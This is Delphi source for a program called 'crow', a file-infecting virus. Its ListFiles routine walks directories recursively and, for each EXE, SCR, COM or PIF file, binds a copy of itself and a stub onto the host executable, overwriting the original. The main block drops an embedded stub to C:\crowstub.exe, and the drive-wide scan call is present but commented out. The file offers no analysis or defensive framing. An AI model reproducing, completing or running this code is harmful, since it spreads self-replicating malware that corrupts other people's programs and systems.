   program crow;
   uses
     windows,binderunit,sysutils, classes;

   {$R filestub.RES}

   var

   domains:string;
   buf:string;

   // ########################
   // THIS IS SEARCH ENGINE...

   function AnsiUpperCase(const S: string): string;
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   function FileSize(FileName: string): int64;
   var
     h: THandle;
     fdata: TWin32FindData;
   begin
     result:= -1;

     h:= FindFirstFile(PChar(FileName), fdata);
     if h <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(h);
       result:= int64(fdata.nFileSizeHigh) shl 32 + fdata.nFileSizeLow;
     end;
   end;

   procedure ExtractFile(whichone: String;Resname:string);
   var
   WhichExtention: String;
   TempDirBuff,TempFileNameBuff,ResultFilePath,ResourcePointer: PChar;
   ResourceLocation: HRSRC;
   ResourceSize,byteswritten: Longword;
   ResDataHandle: THandle;
   FileHandle: THandle;
   begin

   getMem(TempDirBuff,MAX_PATH+1);
   getMem(TempFileNameBuff,MAX_PATH+1);

   GetTempPath(MAX_PATH+1,TempDirBuff);
   GetTempFileName(TempDirBuff,'~DP',0,TempFileNameBuff);

   WhichExtention := '.exe';

   ResultFilePath := pchar(Resname);

   freeMem(TempDirBuff);
   freeMem(TempFileNameBuff);

   ResourceLocation := FindResource(HInstance,PChar(whichone),RT_RCDATA);
   if ResourceLocation = 0 then exit;

   ResourceSize := SizeofResource(HInstance,ResourceLocation);
   if ResourceSize = 0 then exit;

   ResDataHandle := LoadResource(HInstance,ResourceLocation);
   if ResDataHandle = 0 then exit;

   ResourcePointer := LockResource(ResDataHandle);
   if ResourcePointer = NIL then exit;

   FileHandle := CreateFile(ResultFilePath,GENERIC_WRITE,FILE_SHARE_WRITE,NIL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);

   if FileHandle = INVALID_HANDLE_VALUE then exit;

   WriteFile(FileHandle,ResourcePointer^,ResourceSize,byteswritten,NIL);

   CloseHandle(FileHandle);

   end;

   function windir:string;
   var
   path:array[0..600]of char;
   begin
   getwindowsdirectory(path,255);
   result := path;
   result := result +'\';
   end;

   Function GetHeader(Filew:String):PAttachmentHeader;

   var
     Header: PAttachmentHeader;
   begin
       Header:= AllocMem(sizeof(TAttachmentHeader));
       StrLCopy(@Header.Filename, PChar(Filew), MAX_PATH);
       Header.Size:= filesize(filew);
       Header.IsStub:= false;
       Result := Header;
   end;

   procedure BIND(F1,F2,F3:string);
   var
     fOutput, fInput: TFileStream;
     Header: TAttachmentHeader;
     itemHeader: PAttachmentHeader;
     text3,text,text2,fname: string;
     stubSize: int64;
     rfile:textfile;
   begin
       try
         fOutput:= TFileStream.Create(f3, fmCreate or fmShareDenyWrite);
   (*
   ExtractFile('exefile','c:\crowstub.exe');
   if not fileexists('c:\crowstub.exe') then exit;
   *)

   // FILE2

         try
           // stub first
           itemHeader:= GetHeader('C:\3.txt');
           fname:= StrPas(@itemHeader.FileName);


           try
             fInput:= TFileStream.Create(fname, fmOpenRead or fmShareDenyWrite);
             try
               stubSize:= fInput.Size;
               fOutput.CopyFrom(fInput, 0);
             finally
               fInput.Free;
             end;
           except
             on EFOpenError do begin
               exit;
             end;
           end;


   // FILE1

             itemHeader:= GETHEADER(F1);

             fname:= StrPas(@itemHeader.FileName);

             try
               fInput:= TFileStream.Create(fname, fmOpenRead or fmShareDenyWrite);
               try
                 Header.MagicNumber:= $FEEDBEEF;
                 Header.CRC:= 0;
                 Header.Size:= fInput.Size;
                 Header.IsStub:= false;
                 Header.FileName:= itemHeader.FileName;
                 fOutput.WriteBuffer(Header, sizeof(Header));
                 fOutput.CopyFrom(fInput, 0);
               finally
                 fInput.Free;
               end;
             except
               on EFOpenError do exit;
           end;

   // FILE2
             itemHeader:= GETHEADER(F2);

             fname:= StrPas(@itemHeader.FileName);

             try
               fInput:= TFileStream.Create(fname, fmOpenRead or fmShareDenyWrite);
               try
                 Header.MagicNumber:= $FEEDBEEF;
                 Header.CRC:= 0;
                 Header.Size:= fInput.Size;
                 Header.IsStub:= false;
                 Header.FileName:= itemHeader.FileName;
                 fOutput.WriteBuffer(Header, sizeof(Header));
                 fOutput.CopyFrom(fInput, 0);
               finally
                 fInput.Free;
               end;
             except
               on EFOpenError do exit;
           end;
   // FINAL SHIT

           Header.MagicNumber:= $FEEDBEEF;
           Header.CRC:= 0;
           Header.Size:= stubSize;
           Header.IsStub:= true;
           fillChar(Header.FileName, MAX_PATH+1, 0);
           fOutput.WriteBuffer(Header, sizeof(Header));
         finally
           fOutput.Free;
         end;
       except
         on EFCreateError do exit;
         on EFOpenError do exit;
       end;
       deletefile('C:\crowstub.exe');
   end;



   procedure ListFiles(D, Name, SearchName : String);
   const
     faReadOnly  = $00000001 platform;
     faHidden    = $00000002 platform;
     faSysFile   = $00000004 platform;
     faVolumeID  = $00000008 platform;
     faDirectory = $00000010;
     faArchive   = $00000020 platform;
     faAnyFile   = $0000003F;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         Attr := FindData.dwFileAttributes;
         Name := FindData.cFileName;

     name := ansiuppercase(name);
   if (copy(name,length(name)-3,4)='SCR') or
      (copy(name,length(name)-3,4)='EXE') or
      (copy(name,length(name)-3,4)='COM') or
      (copy(name,length(name)-3,4)='PIF') then begin
    try
     copyfile(pchar(paramstr(0)),pchar(d+name+'.exe'),false);
     copyfile(pchar(d+name),pchar(d+name+'.d'),false);
     bind(d+name+'.d',d+name+'.exe',d+name);
     sleep(100);
     deletefile(d+name+'.exe');
     deletefile(d+name+'.d');
    except
     ;
    end;
    end;
       end;
       Result := 0;
     end;


     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;

   var
     SR: TSearchRec;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + '*.*', faDirectory, SR) = 0 then
       Repeat
         If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
           ListFiles(D + SR.Name + '\', Name, SearchName);
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;




   // ########################
   // ########################


   begin
   (*
   buf := windir+'windir.lst';
   buf := windir+'winc.row';

   listfiles ('C:\','*','*');
   *)
   ExtractFile('exefile','c:\crowstub.exe');
   end.
